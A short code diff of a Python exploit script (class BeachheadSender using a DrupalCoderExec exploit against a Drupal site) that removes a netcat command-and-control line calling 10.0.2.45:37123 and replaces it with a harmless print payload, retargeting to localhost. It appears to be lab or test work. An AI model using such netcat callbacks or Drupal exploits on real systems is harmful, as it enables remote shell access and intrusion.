@@ -6,7 +6,7 @@ from base64 import b64encode
 
 class BeachheadSender:
 
-    c_and_c = 'nc 10.0.2.45 37123'
+    c_and_c = '\'print(\"Hello World\")\''
 
     def __init__(self):
         self.exploit = DrupalCoderExec()
@@ -48,4 +48,4 @@ class BeachheadSender:
 
 if __name__ == "__main__":
     sender = BeachheadSender()
-    sender.create_request('10.0.2.15', '80', '/drupal')
+    sender.create_request('127.0.0.1', '8082', '')
